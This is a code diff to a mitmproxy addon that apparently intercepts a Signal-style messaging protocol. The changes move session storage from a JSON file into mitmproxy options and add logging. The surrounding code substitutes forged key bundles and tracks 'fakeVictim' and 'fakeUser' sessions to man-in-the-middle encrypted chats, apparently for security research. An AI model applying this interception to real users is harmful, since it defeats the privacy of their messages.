@@ -27,7 +27,7 @@ from protos.gen import *
 from server_proto import addons, HOST_HTTPBIN
 from mitm_interface import *
 from collections import defaultdict
-
+from mitmproxy import ctx
 
 # logging.getLogger().addHandler(utils.ColorHandler())
 # todo -- fix logging precendence -- https://stackoverflow.com/a/20280587
@@ -111,17 +111,20 @@ class BobIdenKey():
 
 
 registration_info: dict[str, RegistrationInfo] = None
-conversation_session = dict()
+# conversation_session = dict()
 bobs_bundle = dict()
 f = open('registration_info.json', 'wb')
-f.write(b"{}")
-f.close()
-f = open('conversation_info.json', 'wb')
 f.write(b"{}")
 f.close()
 
 api = addons[0]
 
+ctx.options.add_option(
+    name="conversation_session",
+    typespec=dict,
+    default=dict(),
+    help="chat sessions",
+)
 
 def json_to_reginfo(json_registations: str) -> dict[str, RegistrationInfo]:
     loaded_dict = json.loads(json_registations)
@@ -497,18 +500,12 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
     resp.update(fakeBundle_wire)
 
-    with open("conversation_info.json", "r") as f:
-        conversation_session = json.loads(f.read())
-
-    conversation_session[f"{ip_address}:{uuid}"] = (fakeVictim, fakeUser)
-    #logging.warning(f"session {conversation_session}")
+    ctx.options.conversation_session[f"{ip_address}:{uuid}"] = (fakeVictim, fakeUser)
+    logging.warning(f"session {ctx.options.conversation_session}")
 
     assert "privateKey" not in resp['devices'][0]['pqPreKey']
     assert "privateKey" not in resp['devices'][0]['signedPreKey']
     assert "privateKey" not in resp['devices'][0]['pqPreKey']
-    
-    with open("conversation_info.json", "w") as f:
-        f.write(json.dumps(conversation_session, indent=4))
 
     with open("registration_info.json", "w") as f:
         f.write(json.dumps(registration_info, default=dataclass_to_json))
@@ -613,10 +610,9 @@ def _v1_ws_message(flow, identifier):
 
     identifier, destination = strip_uuid_and_id(destination_user)
 
-    with open("conversation_info.json", "r") as f:
-        conversation_session = json.loads(f.read())
+    logging.warning(ctx.options.conversation_session)
 
-    session = conversation_session.get(f"{ip_address}:{destination}")
+    session = ctx.options.conversation_session.get(f"{ip_address}:{destination}")
 
     if session:
         fakeVictim, fakeUser = session
